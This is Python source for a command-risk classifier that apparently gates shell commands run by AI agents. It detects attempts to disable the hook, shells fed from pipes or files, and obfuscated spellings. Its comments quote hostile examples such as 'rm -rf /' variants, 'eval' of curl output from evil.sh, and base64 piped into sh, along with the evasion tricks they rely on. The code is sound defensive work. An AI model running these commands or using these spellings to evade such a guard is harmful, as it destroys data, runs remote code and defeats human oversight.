_PACKAGE_RUNNERS = {"npx", "bunx", "pnpx", "dlx", "pnpm", "yarn", "bun"}
_RAFTER_PACKAGE = re.compile(r"^(?:@rafter-security/cli|rafter-cli|rafter)(?:@[\w.^~*-]+)?$")

# Config keys that gate the hook. A namespace, not a leaf — see hook_control.
_PROTECTED_CONFIG_KEY = re.compile(r"^(?:agent\.)?(?:hooks|commandpolicy)\b|^agent\.risklevel$")


def _statement_disarms_rafter(words: list[_Piece]) -> bool:
    """True if this statement's argv reconfigures or removes a rafter control.

    The rafter invocation is looked for at ANY position, not just as the
    statement's own exec: a shell carrying a command string puts it in the
    operand, so `bash -c "rafter agent config set …"` and `bash -c "$(echo
    rafter …)"` both reduce to a statement whose exec is `bash`. A quoted word
    is skipped on the raw pass so `echo 'rafter agent config set …'` stays
    prose; the sanitized pass sees operands that are actually executed already
    unwrapped.
    """
    for j in range(len(words)):
        if words[j].quoted:
            continue
        k = j
        exec_ = _exec_name(words[k].text)
        k += 1

        if exec_ in _PACKAGE_RUNNERS:
            while k < len(words) and (words[k].text.startswith("-") or words[k].text.lower() in ("dlx", "exec")):
                k += 1
            if k >= len(words) or not _RAFTER_PACKAGE.match(words[k].text.lower()):
                continue
            k += 1
            exec_ = "rafter"
        if exec_ not in _RAFTER_EXECS:
            continue

        args = [w.text.lower() for w in words[k:] if not w.text.startswith("-")]
        for n in range(len(args) - 1):
            if args[n] == "config" and args[n + 1] == "set":
                key = args[n + 2] if n + 2 < len(args) else None
                if key and _PROTECTED_CONFIG_KEY.match(key):
                    return True
            if args[n] == "agent" and args[n + 1] == "disable":
                return True
    return False


def _disarms_rafter(command: str, depth: int = 0) -> bool:
    """True if any statement (or command substitution) disarms rafter."""
    if depth > _MAX_SANITIZE_DEPTH:
        return False
    pieces, _ = _tokenize(command)
    statements: list[list[_Piece]] = []
    stmt: list[_Piece] = []
    for p in pieces:
        if p.op is not None:
            if p.op in _CHAIN_OPS or p.op in ("\n", "\r"):
                statements.append(stmt)
                stmt = []
            continue
        stmt.append(p)
        for sub in (p.substs or []):
            if _disarms_rafter(sub, depth + 1):
                return True
    statements.append(stmt)
    return any(_statement_disarms_rafter(st) for st in statements)


def modifies_rafter_security_config(command: str) -> bool:
    """True if the command disarms rafter, checked on raw AND sanitized text.

    Raw catches the ordinary invocation; sanitized catches a shell running the
    OUTPUT of something else, whose own exec is `echo` and which a walk over
    the raw argv therefore reads, correctly, as a print.
    """
    if _disarms_rafter(command):
        return True
    sanitized = sanitize_command_for_matching(command)
    return sanitized != command and _disarms_rafter(sanitized)


def shell_program_from_stream(command: str) -> bool:
    """True if a SHELL receives its program through a channel rather than as a path.

    rf-zvll mechanism B. Three shapes, all measured executing by the sandboxed
    oracle while classifying `low`:

        cat payload.txt | sh        the payload is in a file
        echo <b64> | base64 -d | sh the payload is encoded
        bash < payload.txt          no pipe at all, just a redirect

    The classifier cannot read any of them, so no amount of better parsing
    recovers the payload -- this is a POSTURE decision, not an analysis one. A
    shell fed from a channel requires approval regardless of whether we can see
    what it is being fed.

    DELIBERATELY EXCLUDES a plain file ARGUMENT (`bash deploy.sh`). We cannot
    read that either, so the distinction is not one of RISK -- it is one of
    FREQUENCY, and saying so plainly matters more than dressing it up. Measured
    over 13,613 intercepted commands: the stream forms are 0.022% of traffic in
    2 of 665 repos, while `curl|wget` into a shell -- already approval-gated --
    is 100 events. The form that already prompts is 33x more common than
    everything this newly gates, so the added prompt volume is ~3% of what
    curl|bash already generates. That sample is ONE machine; the limit and what
    would overturn it are recorded on rf-zvll.
    """
    pieces, _ = _tokenize(command)
    segments: list[list[_Piece]] = []
    enders: list[str | None] = []
    cur: list[_Piece] = []
    for piece in pieces:
        if piece.op is not None and piece.op in _CHAIN_OPS:
            segments.append(cur); enders.append(piece.op); cur = []
            continue
        cur.append(piece)
    segments.append(cur); enders.append(None)

    def _resolve(seg: list[_Piece]) -> str:
        """Exec of a segment, skipping wrappers, their flags and env assignments.

        Iterative, not one step: `env FOO=1 bash` needs two skips, and a single
        lookahead silently resolved to `FOO=1` -- caught by its own test row.
        """
        words = [w for w in seg if w.op is None]
        k = 0
        while k < len(words):
            t = words[k].text
            if _ENV_ASSIGNMENT.match(t) or t.startswith("-"):
                k += 1
                continue
            if _exec_name(t) in _TAIL_WRAPPERS:
                k += 1
                continue
            return _exec_name(t)
        return ""

    for idx, seg in enumerate(segments):
        exec_ = _resolve(seg)
        # `eval "$(cat f)"` / `eval "$(curl -s http://x)"` -- a program-executing
        # consumer fed from a substitution whose OUTPUT we cannot read. Same
        # semantic test as the pipe case; pipe-vs-substitution is syntax.
        #
        # Deliberately covers ANY substitution rather than only data-readers.
        # A reader-only rule looked tempting and misses
        # `eval "$(curl -s http://evil.sh)"` -- remote code, the worst shape in
        # the set -- so the narrow version was rejected on that, not on taste.
        # Measured cost of the broad rule: ZERO occurrences in 13,647 commands
        # across 671 repos, so it gates nothing anyone actually runs here.
        if exec_ in _EVAL_EXECS and any(w.op is None and w.substs for w in seg):
            return True
        if exec_ in _SHELL_EXECS:
            # `bash < file` / `bash <<< str` -- the program arrives on stdin.
            for w in seg:
                if w.op in ("<", "<<<"):
                    return True
        # `… | bash` -- this segment's OUTPUT is the next one's program.
        if enders[idx] == "|" and idx + 1 < len(segments):
            if _resolve(segments[idx + 1]) in _SHELL_EXECS:
                return True
    return False


# ---------------------------------------------------------------------------
# Obfuscation normalizer + evasion-construct detector (sable-jtxp)
# ---------------------------------------------------------------------------
#
# The risk patterns match the SPELLING of a command, so an attacker can keep a
# catastrophic command's effect while changing its spelling past the patterns:
# long flags (`rm --recursive --force /`), `$IFS` word-splitting
# (`rm${IFS}-rf${IFS}/`), brace expansion (`{rm,-rf,/}`), ANSI-C quoting
# (`bash -c $'rm\x20-rf\x20/'`), or process substitution into a shell
# (`sh <(curl …)`). Two layers answer this, applied in assess_command_risk:
#
#   1. normalize_for_matching() un-obfuscates a bounded set of these spellings --
#      WITHOUT executing anything -- and the patterns match the normalized form
#      as well as the raw/sanitized one (highest risk wins).
#   2. evasion_construct_risk() independently rates the obfuscation constructs
#      themselves as approval-grade, so a construct whose decoded payload the
#      classifier still cannot read is gated rather than allowed.
#
# LIMITATION: this is heuristic DEFENCE IN DEPTH, not an airtight boundary. It
# shrinks the evasion surface for the known constructs; it does not and cannot
# enumerate every encoding (runtime variable assembly, nested unreadable
# substitutions, a payload piped into a non-shell interpreter). The durable fix
# is the deny-by-default execution redesign, tracked separately (sable-jtxp).
# Everything here only ever EXPOSES more to the patterns -- the safe direction --
# and the quoted-data redaction in sanitize_command_for_matching still runs on
# the normalized form, so decoding a quoted commit message does not make it match.

_MAX_NORMALIZE_INPUT = 20000
_MAX_NORMALIZE_OUTPUT = 40000
_MAX_BRACE_PASSES = 24

_ANSI_C_SIMPLE = {
    "t": "\t", "n": "\n", "r": "\r", "\\": "\\", "'": "'", '"': '"',
    "a": "\x07", "b": "\b", "f": "\f", "v": "\v", "e": "\x1b", "E": "\x1b",
}
_BRACE_LIST = re.compile(r"(?<!\$)\{([^{}]*,[^{}]*)\}")
_BRACE_CMD = re.compile(r"^\{[^{}]*,[^{}]*\}")
_RM_CANON = re.compile(
    r"(^|[\s;&|()<>])((?:[\w./-]*/)?rm)((?:[ \t]+--?[A-Za-z][\w-]*)*)",
    re.IGNORECASE,
)


def _decode_ansi_c_quotes(s: str) -> str:
    """Decode an ANSI-C ``$'…'`` string's escapes, keeping it ONE quoted word.

    Parses ``$'…'`` with its own escape rules (``\\'`` does NOT terminate),
    which is why plain single-quote handling cannot see through it.
    """
    if "$'" not in s:
        return s
    out: list[str] = []
    i = 0
    n = len(s)
    while i < n:
        if s[i] == "$" and i + 1 < n and s[i + 1] == "'":
            i += 2
            decoded: list[str] = []
            while i < n and s[i] != "'":
                if s[i] == "\\" and i + 1 < n:
                    i += 1
                    c = s[i]
                    if c in ("x", "X"):
                        i += 1
                        hex_ = ""
                        while i < n and len(hex_) < 2 and s[i] in "0123456789abcdefABCDEF":
                            hex_ += s[i]
                            i += 1
                        decoded.append(chr(int(hex_, 16)) if hex_ else "x")
                        continue
                    if "0" <= c <= "7":
                        oct_ = ""
                        while i < n and len(oct_) < 3 and "0" <= s[i] <= "7":
                            oct_ += s[i]
                            i += 1
                        decoded.append(chr(int(oct_, 8) & 0xFF))
                        continue
                    decoded.append(_ANSI_C_SIMPLE.get(c, c))
                    i += 1
                    continue
                decoded.append(s[i])
                i += 1
            if i < n:
                i += 1  # consume the closing quote
            out.append("'" + "".join(decoded).replace("'", "'\\''") + "'")
            continue
        out.append(s[i])
        i += 1
    return "".join(out)


def _expand_brace_lists(s: str) -> str:
    """Expand simple brace lists ``{a,b,c}`` to space-separated ``a b c``.

    Space-join, NOT the shell's cartesian product, so adjacent groups cannot blow
    up; the over-approximation only exposes more tokens. ``(?<!\\$)`` leaves
    ``${VAR}`` alone and a comma is required, so ``${IFS}`` and ``{}`` are
    untouched. Innermost-first over bounded passes handles nesting.
    """
    if "{" not in s:
        return s
    passes = 0
    prev = None
    while prev != s and passes < _MAX_BRACE_PASSES:
        prev = s
        s = _BRACE_LIST.sub(lambda m: " ".join(m.group(1).split(",")), s)
        passes += 1
        if len(s) > _MAX_NORMALIZE_OUTPUT:
            s = s[:_MAX_NORMALIZE_OUTPUT]
            break
    return s


def _canonicalize_rm_flags(s: str) -> str:
    """Reduce an ``rm`` carrying BOTH recursive and force intent -- in any long,
    short or ``--no-preserve-root`` spelling, adjacent or not -- to the ``rm -rf``
    form the patterns catch. Scoped to ``rm`` and only ever adds ``-rf``."""
    if not re.search(r"\brm\b", s, re.IGNORECASE):
        return s

    def repl(m: "re.Match[str]") -> str:
        pre, cmd, flags = m.group(1), m.group(2), m.group(3)
        if not flags.strip():
            return m.group(0)
        recursive = force = False
        for tok in flags.split():
            low = tok.lower()
            if low.startswith("--"):
                if low == "--recursive":
                    recursive = True
                elif low in ("--force", "--no-preserve-root"):
                    force = True
            else:
                if "r" in low:
                    recursive = True
                if "f" in low:
                    force = True
        return f"{pre}{cmd} -rf" if (recursive and force) else m.group(0)

    return _RM_CANON.sub(repl, s)


def normalize_for_matching(command: str) -> str:
    """A spelling-normalized view of a command for pattern matching.

    Decodes ANSI-C quoting, substitutes ``$IFS``/``${IFS}``, expands brace lists,
    canonicalizes destructive-flag spellings, and collapses whitespace runs.
    Executes nothing; bounded against hostile input.
    """
    if not command:
        return command
    s = command[:_MAX_NORMALIZE_INPUT] if len(command) > _MAX_NORMALIZE_INPUT else command
    s = _decode_ansi_c_quotes(s)
    s = re.sub(r"\$\{IFS\}", " ", s)
    s = re.sub(r"\$IFS(?![A-Za-z0-9_])", " ", s)
    s = _expand_brace_lists(s)
    s = _canonicalize_rm_flags(s)
    # Collapse runs of spaces/tabs; keep newlines/CRs as statement separators.
    s = re.sub(r"[^\S\n\r]+", " ", s)
    if len(s) > _MAX_NORMALIZE_OUTPUT:
        s = s[:_MAX_NORMALIZE_OUTPUT]
    return s


def _resolve_exec_piece(seg: list[_Piece]) -> _Piece | None:
    """The exec piece of a segment (skipping env assignments and prefix wrappers)."""
    is_redirect_target = [False] * len(seg)
    for i in range(1, len(seg)):
        if seg[i - 1].op in _REDIRECT_OPS and seg[i].op is None:
            is_redirect_target[i] = True
    i = 0
    while i < len(seg):
        p = seg[i]
        if p.op is not None or is_redirect_target[i]:
            i += 1
            continue
        if not p.quoted and _ENV_ASSIGNMENT.match(p.text):
            i += 1
            continue
        if not p.quoted and _exec_name(p.text) in _TAIL_WRAPPERS:
            j = i + 1
            while j < len(seg):
                q = seg[j]
                if q.op is not None or is_redirect_target[j]:
                    j += 1
                    continue
                if q.text.startswith("-") or _NUMERIC_ARG.match(q.text):
                    j += 1
                    continue
                break
            i = j
            continue
        return p
    return None


def evasion_construct_risk(command: str) -> bool:
    """True if the command uses a shell OBFUSCATION construct that should require
    approval even when the normalized payload still cannot be read: ``$IFS``
    splitting, ANSI-C ``$'…'``, a brace list in COMMAND position, a process
    substitution feeding a shell/eval, or a base64 decode piped into a shell.
    Narrow by design -- a brace ARGUMENT or a process substitution into a
    non-shell (``diff <(a) <(b)``) is routine and not flagged."""
    if not command:
        return False
    s = command[:_MAX_NORMALIZE_INPUT] if len(command) > _MAX_NORMALIZE_INPUT else command
    if re.search(r"\$\{IFS\}|\$IFS\b", s):
        return True
    if "$'" in s:
        return True
    if re.search(r"\bbase64\b[\s\S]*\|\s*(ba|z|da|k|a)?sh\b", s, re.IGNORECASE):
        return True

    pieces, unterminated = _tokenize(s)
    if unterminated:
        return False
    segments: list[list[_Piece]] = []
    seg: list[_Piece] = []
    for p in pieces:
        if p.op is not None and p.op in _CHAIN_OPS:
            segments.append(seg)
            seg = []
            continue
        seg.append(p)
    segments.append(seg)

    for segment in segments:
        exec_piece = _resolve_exec_piece(segment)
        if exec_piece is None:
            continue
        if exec_piece.text and _BRACE_CMD.match(exec_piece.text):
            return True
        name = _exec_name(exec_piece.text)
        if name in _SHELL_EXECS or name in _EVAL_EXECS:
            for p in segment:
                if p.op is None and p.text == "" and p.substs:
                    if s[p.start:p.start + 2] in ("<(", ">("):
                        return True
    return False


def _match_variants(command: str) -> list[str]:
    """The distinct sanitized views a command's risk is judged against: the raw
    command and -- when normalization changed it -- the spelling-normalized one."""
    raw = sanitize_command_for_matching(command).strip()
    variants = [raw] if raw else []
    normalized = normalize_for_matching(command)
    if normalized != command:
        norm_san = sanitize_command_for_matching(normalized).strip()
        if norm_san and norm_san != raw:
            variants.append(norm_san)
    return variants


def assess_command_risk(command: str) -> str:
    """Assess risk level of a command string."""
    # rf-vnxs: checked before the pattern loops. The disarm is an ordinary
    # well-formed invocation — nothing malformed for the sanitizer to normalise.
    if modifies_rafter_security_config(command):
        return "critical"
    # sable-jtxp: match against the raw AND the spelling-normalized view, so a
    # command whose spelling evades the patterns is still caught.
    variants = _match_variants(command)
    if not variants:
        return "low"
    for p in CRITICAL_PATTERNS:
        if any(re.search(p, v, re.IGNORECASE) for v in variants):
            return "critical"
    # rf-zvll B2 + sable-jtxp: a shell fed its program from a channel we cannot
    # read, or an obfuscation construct whose payload we cannot read, requires
    # approval. Checked AFTER critical so `echo 'rm -rf /' | sh` -- where the
    # payload IS readable and matches -- keeps its hard block rather than being
    # softened to approval.
    if shell_program_from_stream(command) or evasion_construct_risk(command):
        return "high"
    for p in HIGH_PATTERNS:
        if any(re.search(p, v, re.IGNORECASE) for v in variants):
            return "high"
    for p in MEDIUM_PATTERNS:
        if any(re.search(p, v, re.IGNORECASE) for v in variants):
            return "medium"
    return "low"


def match_critical_pattern(command: str) -> str | None:
    """Return the first CRITICAL pattern matching the command, or None.

    Mirrors assess_command_risk's sanitization and normalization. Intended to be
    called only once a command is already classified "critical", to surface
    *which* built-in rule matched.
    """
    variants = _match_variants(command)
    for p in CRITICAL_PATTERNS:
        if any(re.search(p, v, re.IGNORECASE) for v in variants):
            return p
    return None
